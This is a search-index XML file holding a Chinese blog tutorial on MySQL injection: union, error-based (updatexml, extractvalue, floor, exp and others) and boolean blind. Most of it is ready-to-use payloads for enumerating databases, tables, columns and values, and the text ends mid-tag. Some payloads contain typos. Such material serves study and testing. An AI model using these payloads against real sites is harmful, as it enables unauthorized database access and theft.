<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>mysql注入手法</title>
      <link href="/blog/mysql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95/"/>
      <url>/blog/mysql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ol><li>所有的注入过程中，都需要思考目标可能使用的SQL语句，再根据我们可以控制的部分结构进行尝试注入  </li><li>字符型注入都需要先闭合才可以继续进行</li></ol><h1 id="union查询注入"><a href="#union查询注入" class="headerlink" title="union查询注入"></a>union查询注入</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>页面将SQL语句执行后返回的内容显示在了页面中，这种情况叫做有回显。  </p><p>对于有回显的情况来说，通常使用联合查询注入法，其作用就是，在原来查询条件的基础上，通过关键字<code>union</code>、<code>union all</code>拼接恶意SQL语句，<code>union</code>后面的<code>select</code>得到的结果将拼接到前个<code>select</code>的结果的后面  </p><p>正常情况下，SQL语句的union联合查询常用格式如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> xxx <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">from</span> vuls;  </span><br><span class="line"><span class="operator">+</span><span class="comment">---+---+---+  </span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span> <span class="operator">|</span> <span class="number">3</span> <span class="operator">|</span>  </span><br><span class="line"><span class="operator">+</span><span class="comment">---+---+---+  </span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span> <span class="operator">|</span> <span class="number">3</span> <span class="operator">|</span>  </span><br><span class="line"><span class="operator">|</span> <span class="number">4</span> <span class="operator">|</span> <span class="number">5</span> <span class="operator">|</span> <span class="number">6</span> <span class="operator">|</span>  </span><br><span class="line"><span class="operator">+</span><span class="comment">---+---+---+  </span></span><br></pre></td></tr></table></figure><p>在注入过程中，我们把<code>union select 4,5,6 from vuls</code> 部分称作时union注入部分，它的主要特点时通过union和前面一条SQL语句拼接，并构造其列数与前面SQL语句列数相同。  </p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol><li>union查询时，我们构造的select语句的字段数要和当前表的字段数相同才能联合查询，否则会抛出<code>The used SELECT statements have a different number of columns</code>的错误  </li><li>若回想仅支持第一行数据的话，我们需要让union前面正常查询的语句的返回结果为空，才能让我们想要的数据展现出来；返回为空只需要让union前面的内容在数据库中查询不到结果即可  </li><li><code>union</code>，<code>unionall</code>区别  <ul><li><code>union</code>：对两个结果集进行并集操作，不包括重复行，同时进行默认规则的排序  </li><li><code>union all</code>: 对两个结果集进行并集操作，包括重复行，不进行排序</li></ul></li></ol><h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><p><strong>1、确认列数：</strong> 前面说过，我们union查询前后字段数必须是一样的才能查询，因此我们的第一步，就是通过<code>order by</code>或<code>group by </code>获取当前查询的字段数;  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3 -- 返回正常  </span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">-- 返回错误  </span></span><br><span class="line"><span class="comment">--说明字段数为3  </span></span><br></pre></td></tr></table></figure><p><strong>2、判断显位：</strong> 既然已经知道了查询列数了，那我们就需要<strong>判断哪些列的哪些内容可以显示到前端的</strong>，因为能显示到前端的字段，我们在利用时也能显示我们想要的数据  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,3 -- </span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">-- 显示我们想要的1，2，3  </span></span><br></pre></td></tr></table></figure><p><strong>3、获取数据：</strong> 已经知道哪些列可以显示出来了，直接替换为我们的sql语句即可<br>首先查询当前数据库名database()、数据库账号user()、数据库版本version()等基本信息，再根据不同版本，不同的权限来确定接下来的方法  </p><table><thead><tr><th>版本</th><th>手法说明</th></tr></thead><tbody><tr><td>MySQL &lt; 5.0</td><td>小于5.0，由于缺乏系统库<code>information</code>，故通常情况下，无法直接找到表，字段等信息，只能通过猜解的方式来解决<br>直接猜库名，表名，列名，再使用联合查询，当然也可以使用布尔盲注来猜解</td></tr><tr><td>MySQL &gt;&#x3D;5.0</td><td>存在系统库informtion_schema,可直接查询到库名，表名，列名等信息</td></tr></tbody></table><p>查询数据的一般顺序为 <strong>库名–&gt;表名–&gt;列名–&gt;字段内容等信息</strong>  </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单来说，整个union注入的过程：判断列数-&gt;判断显位-&gt;查库名-&gt;查表名-&gt;查列名-&gt;查值  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 判断字段数目  </span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>  </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="number">4</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">-- 联合查询收集信息(表中字段数为3，注意字符类型，如int,string之类的)  </span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">-- 查询当前数据库名称  </span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database();  </span><br><span class="line">  </span><br><span class="line"><span class="comment">-- 查询所有数据库  </span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">-- 查询当前数据库中的所有表名  </span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database();  </span><br><span class="line">  </span><br><span class="line"><span class="comment">-- 查询某表的列名，student 表示 具体的表名  </span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;student&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">-- 查询数据  </span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> group_concat(id,name,age) <span class="keyword">from</span> student;  </span><br></pre></td></tr></table></figure><h2 id="扩展：limit注入点字段数判断"><a href="#扩展：limit注入点字段数判断" class="headerlink" title="扩展：limit注入点字段数判断"></a>扩展：limit注入点字段数判断</h2><p>如果注入点在limit后，想要判断字段数，可通过<code>into @,@</code>的手法，其中<code>@</code>为mysql的临时变量  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> limit <span class="number">1</span> <span class="keyword">into</span> @,@;  </span><br></pre></td></tr></table></figure><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>服务器会将数据库执行产生的异常信息抛出显示到前端，这个时候我们认为地制造错误条件，就可以让查询结果能够出现在错误信息中。  </p><p>一般用户union注入受到限制且能返回错误信息的情况下，毕竟盲注要发送很多雷士的请求，耗时且容易被封。  </p><h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><ol><li>报错函数通常有最长报错信息输出的限制(限制了输出长度，比如只能显示32位)，面对这种情况，可以进行分割输出  </li><li>特殊函数的特殊参数运行一个字段、一行数据的返回，使用<code>group_concat</code>等聚合函数即可</li></ol><h2 id="注入流程-1"><a href="#注入流程-1" class="headerlink" title="注入流程"></a>注入流程</h2><p>直接查询数据库，不需要判断字段数、显位等；查询语句和union一样，毕竟都是从数据库中查询数据。  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 确认闭合  </span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">-- 查询数据库名  </span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(0x7e,concat(0x7e,(select database()),0x7e)) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">-- 查询当前数据库所有的表名  </span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(0x7e,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database())),0x7e) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>  </span><br></pre></td></tr></table></figure><h2 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h2><h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><p><strong>相关函数：</strong>  </p><ul><li><code>floor()</code>函数，向下取整，小数部分舍弃  </li><li><code>rand()</code>函数，取随机数，若有参数x，则每个x对应一个固定的值  </li><li><code>count()</code>函数，统计结果数量  </li><li><code>select floor(rand(0)*2) from information_schema.schemata; </code>后面表可以随意换，只要数据量&gt;&#x3D;6即可，产生的固定序列为011011…<br><strong>报错原理：</strong><br>利用数据库表主键不能重复的原理，使用group by 分组，产生主键key冗余，导致报错<br>构建sql语句  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) <span class="keyword">as</span> x <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> x  </span><br></pre></td></tr></table></figure><blockquote><p>group by 进行分组时，<code>floor(rand(0)*2)</code>执行一次(查看分组是否存在)，如果虚拟表中不存在该分组，那么在插入新分组的时候<code>floor(rand(0)*2)</code>就又计算了一次</p></blockquote></li></ul><p><strong>利用条件:</strong>  </p><ol><li>整个查询过程<code>floor(rand(0)*2)</code>被计算了5次，查询原数据表3次，所以要保证floor报错注入，那么必须保证数据库中相关的表必须大于三条数据  </li><li>需要<code>count(*)</code>，<code>rand()</code>、<code>group by</code>，三者缺一不可<br><strong>利用语句:</strong>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)  </span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) <span class="keyword">as</span> x <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> x <span class="comment">-- 变形  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">-- 获取数据库名  </span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span>  </span><br><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="number">0x23</span>,database(),<span class="number">0x23</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) <span class="keyword">as</span> x <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> x) <span class="keyword">as</span> y)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">-- 获取表名  </span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span>  </span><br><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="number">0x23</span>),(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tblaes <span class="keyword">where</span> table_schema<span class="operator">=</span>database(),limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x23</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)) <span class="keyword">as</span> x <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> x)<span class="keyword">as</span> y)  </span><br></pre></td></tr></table></figure></li></ol><h3 id="extractValue"><a href="#extractValue" class="headerlink" title="extractValue()"></a>extractValue()</h3><p><strong>函数语法：</strong><code> extractvalue(xml_frag,xpath_expr)</code>  </p><p><strong>适用范围：</strong><code>&gt;=5.1.5</code>  </p><p><strong>报错原理：</strong> Xpath格式语法书写错误的话，就会报错，如下所示  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> extractvalue(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;x&lt;/b&gt;&lt;b&gt;y&lt;/b&gt;&lt;/a&gt;&#x27;</span>,<span class="string">&#x27;#aaa&#x27;</span>) <span class="keyword">as</span> <span class="keyword">result</span>;  </span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;#aaa&#x27;</span>  </span><br></pre></td></tr></table></figure><blockquote><p>由于此报错注入和<code>updatexml</code>都只能爆最大32位，如果要爆出32位之后的数据，需要借助<code>mid</code>或者<code>substr</code>等切割函数进行字符截取从而显示32位以后的数据  </p></blockquote><p><strong>利用语句：</strong>  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,mid(concat(0x23,  </span></span><br><span class="line"><span class="string">(SELECT group_concat(table_name) from information_schema.tables where table_schema = database()),0x23),1,32)) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>  </span><br></pre></td></tr></table></figure><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><p><strong>函数语法：</strong> <code>updatexml(xml_document,Xpath+string,new_value)</code>  </p><p><strong>适用范围：</strong>&gt;&#x3D;5.1.5  </p><p><strong>报错原理:</strong> Xpath格式语法书写错误的话，就会报错，同<code>extractValue()</code>  </p><p><strong>利用语句：</strong>  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x23</span>,<span class="keyword">user</span>(),<span class="number">0x23</span>),<span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,mid(concat(0x23,(SELECT group_concat(table_name) from information_schema.tables where table_schema = database()),0x23),1,32),1) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>  </span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h3><p><strong>函数语法：</strong> <code>exp(int x)</code> -&gt; 返回<code>e **x</code>  </p><p><strong>适用范围：</strong> 适用于<code>mysql&lt;=5.5.52</code>时，<code>&gt;5.5.53</code>则不能返回查询结果  </p><p><strong>报错原理：</strong> e的x次方到x每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错。  </p><blockquote><p>将0按位取反，<code>~0</code>，取值为<code>18446744073709551615</code>,这个值比double范围最大值要大，所以再利用mysql函数增产取值之后会返回0的特性，那么当函数执行成功，然后按位取反之后得到的值直接造成double型溢出  </p></blockquote><p><strong>利用语句：</strong>  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> version())x));  </span><br><span class="line">  </span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and exp(~(select * from (select version())x)) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>  </span><br></pre></td></tr></table></figure><p><code>exp()</code>函数套用两层子查询的原因：  </p><ol><li>先查询<code>select version()</code> 这里面的语句，将这里面查询出来的数据作为一个结果集，取名为x  </li><li>再<code>select * from x</code> 查询x，将结果集x全部查询出来；这里必须使用嵌套，因为不使用嵌套不加<code>select * from </code>无法大整数溢出</li></ol><h2 id="GTID相关函数"><a href="#GTID相关函数" class="headerlink" title="GTID相关函数"></a>GTID相关函数</h2><p><strong>报错原理：</strong> 参数格式不正确  </p><p><strong>适用范围：</strong> <code>&gt;=5.7</code>  </p><p><strong>利用语句：</strong>  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> GTID_SUBSET(<span class="keyword">user</span>(),<span class="number">1</span>);  </span><br><span class="line"><span class="keyword">select</span> GTID_SUBTRACT(<span class="keyword">user</span>(),<span class="number">1</span>);  </span><br></pre></td></tr></table></figure><h2 id="ST相关函数"><a href="#ST相关函数" class="headerlink" title="ST相关函数"></a>ST相关函数</h2><p><strong>报错原理：</strong> 参数格式不正确  </p><p><strong>适用范围：</strong><code>&gt;=5.7</code>  </p><p><strong>利用语句：</strong>  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ST_LaFromGeoHash(version())；  </span><br><span class="line"><span class="keyword">select</span> ST_LongFromGeoHash(version());  </span><br><span class="line"><span class="keyword">select</span> ST_PointFromGeoHash(version(),<span class="number">0</span>);  </span><br></pre></td></tr></table></figure><h2 id="几何函数"><a href="#几何函数" class="headerlink" title="几何函数"></a>几何函数</h2><p><strong>报错原理：</strong> 函数对参数要求时形如(1 2,3 3,2 2 1)这样的几何数据，如果不满足要求则会报错  </p><p><strong>利用语句:</strong>  </p><table><thead><tr><th>函数</th><th>用法</th></tr></thead><tbody><tr><td>GeometryCollection()</td><td><code>GeometryCollection((select * from (select * from  (select user())a)b))</code></td></tr><tr><td>polygon()</td><td><code>polygon((select * from (select * from (select user())a)b))</code></td></tr><tr><td>multipoint()</td><td><code>multipoint((select * from (select * from (select user())a)b))</code></td></tr><tr><td>multilinestring()</td><td><code>multilinestring((select * from (select * from (selct user())a)b))</code></td></tr><tr><td>linestring()</td><td><code>linestring((select * from (select * from (select user())a)b))</code></td></tr><tr><td>multipolygon()</td><td><code>multipolygon((select * from (select * from (select user())a)b))</code></td></tr></tbody></table><h2 id="BIGINT"><a href="#BIGINT" class="headerlink" title="BIGINT"></a>BIGINT</h2><p><strong>报错原理：</strong><br>当mysql数据库的某些边界数值进行数值运算时，会产生报错。  </p><p>如<code>~0</code> 得到的结果：18446744073709551615  </p><p>若此数参与运算，则很容易会错误  </p><p><strong>利用语句：</strong>  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">!</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())a)<span class="operator">-</span><span class="operator">~</span><span class="number">0</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">-- 当前用户  </span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and !(select * from (select user())a)-~0  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">-- 当前数据库的所有表名  </span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="operator">!</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())a)<span class="operator">-</span><span class="operator">~</span><span class="number">0</span> <span class="comment">--   </span></span><br></pre></td></tr></table></figure><h1 id="uuid相关函数"><a href="#uuid相关函数" class="headerlink" title="uuid相关函数"></a>uuid相关函数</h1><p><strong>适用范围：</strong> <code>&gt;=8.0</code>  </p><p><strong>报错原理：</strong> 参数格式不正确会导致报错  </p><p><strong>利用语句：</strong>  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> uuid_to_bin((<span class="keyword">select</span> database()));  </span><br><span class="line"><span class="keyword">select</span> bin_to_uuid((<span class="keyword">select</span> database()));  </span><br></pre></td></tr></table></figure><h2 id="不存在的函数"><a href="#不存在的函数" class="headerlink" title="不存在的函数"></a>不存在的函数</h2><p><strong>报错原理：</strong> 随便使用不存在的函数，可能会得到当前数据库的名称  </p><p><strong>利用语句：</strong>  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a();  </span><br></pre></td></tr></table></figure><h2 id="name-const"><a href="#name-const" class="headerlink" title="name_const()"></a>name_const()</h2><p><strong>报错原理：</strong> mysql列名重复会导致报错，通过<code>name_const</code>制造一个列，配合笛卡尔积查询得到列名  </p><p><strong>局限：</strong> 仅可取数据库版本信息  </p><p><strong>利用语句：</strong>  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> name_const(verion(),<span class="number">0x1</span>),name_const(version(),<span class="number">0x1</span>))a;  </span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (select * from(select name_const(version(),0x1),name_const(version(),0x1))a) --   </span></span><br></pre></td></tr></table></figure><h2 id="join-uing"><a href="#join-uing" class="headerlink" title="join uing"></a>join uing</h2><p><strong>报错原理：</strong> 系统关键词<code>join</code>可建立两个表之间的内连接  </p><p>通过对想要查询列名的表与其自身建立内连接，由于冗余的原因（相同列名存在），而发生错误，并且报错信息会存在重复的列名，可以使用using表达式声明内连接（inner join）条件避免报错  </p><p><strong>局限：</strong> 在知道数据库跟表名的情况下使用才可以爆字段  </p><p><strong>利用语句：</strong>  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 a <span class="keyword">join</span> 表名 b) c;<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b) c;  </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)b)c;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 a <span class="keyword">join</span> 表名 b <span class="keyword">using</span> (已知的字段,已知的字段) c)  </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span> (id)) c;  </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span> (id,username)) c;  </span><br></pre></td></tr></table></figure><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p><strong>核心：</strong> 利用逻辑符号&#x2F;条件函数，让返回内容&#x2F;响应时间与正常页面不符，从而让我们可以观察到差异。  </p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><p>通过页面对永真条件如<code>and 2*3=6</code> 和永假条件如<code>and 2*3=5</code> 返回的内容是否存在差异，进行判断是否可以进行布尔盲注；  </p><p>页面通常返回存在（True）&#x2F;不存在（False）两种结果，通过这两种结果就可以判断是否存在布尔盲注  </p><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><blockquote><p>布尔盲注主要依赖于返回结果的差异判断，所有我们在注入过程中也只能一位一位的进行判断，在判断长度的时候或者切割字符串的时候，就需要用到一些内置的函数  </p></blockquote><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td><code>ascii()</code></td><td>返回指定字符的ascii码值</td></tr><tr><td><code>count()</code></td><td>返回计算结果集的数量</td></tr><tr><td><code>length()</code></td><td>返回指定字符串的长度</td></tr><tr><td><code>substring()</code></td><td>返回截取的字符串</td></tr></tbody></table><h3 id="注入流程-2"><a href="#注入流程-2" class="headerlink" title="注入流程"></a>注入流程</h3><ol><li>闭合SQL语句  </li><li>计算当前数据库名长度  </li><li>逐字节获取数据库名  </li><li>计算表的数量  </li><li>计算表名的长度  </li><li>逐字节获取表名  </li><li>计算列的数量  </li><li>计算列的长度  </li><li>逐字节获取列名  </li><li>计算字段的数量  </li><li>计算字段内容的长度  </li><li>逐字节获取字段内容</li></ol><h3 id="常见语句"><a href="#常见语句" class="headerlink" title="常见语句"></a>常见语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 计算当前数据库名长度  </span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(database()) &gt;7 -- -true  </span></span><br><span class="line"><span class="string">and length(database()) &gt;8 -- -false  </span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> length(database()) <span class="operator">=</span><span class="number">8</span> <span class="comment">-- -  </span></span><br><span class="line"><span class="comment">-- 逐字节获取数据库名  </span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and left(database(),1)=&#x27;</span>s<span class="string">&#x27; -- -true  </span></span><br><span class="line"><span class="string">and left(database(),2)=&#x27;</span>se<span class="string">&#x27; -- -true  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> substr(dastabase(),<span class="number">1</span>,<span 